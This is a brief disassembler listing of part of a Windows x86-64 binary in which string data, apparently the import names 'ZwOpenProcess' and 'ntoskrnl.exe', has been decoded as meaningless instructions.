   140005168:	63 65 73             	movsxd 0x73(%rbp),%esp
   14000516b:	73 00                	jae    0x14000516d
   14000516d:	00 c4                	add    %al,%ah
   14000516f:	0b 5a 77             	or     0x77(%rdx),%ebx
   140005172:	4f 70 65             	rex.WRXB jo 0x1400051da
   140005175:	6e                   	outsb  (%rsi),(%dx)
   140005176:	50                   	push   %rax
   140005177:	72 6f                	jb     0x1400051e8
   140005179:	63 65 73             	movsxd 0x73(%rbp),%esp
   14000517c:	73 00                	jae    0x14000517e
   14000517e:	6e                   	outsb  (%rsi),(%dx)
   14000517f:	74 6f                	je     0x1400051f0
   140005181:	73 6b                	jae    0x1400051ee
   140005183:	72 6e                	jb     0x1400051f3
   140005185:	6c                   	insb   (%dx),(%rdi)
   140005186:	2e 65 78 65          	cs js,pn 0x1400051ef
	...
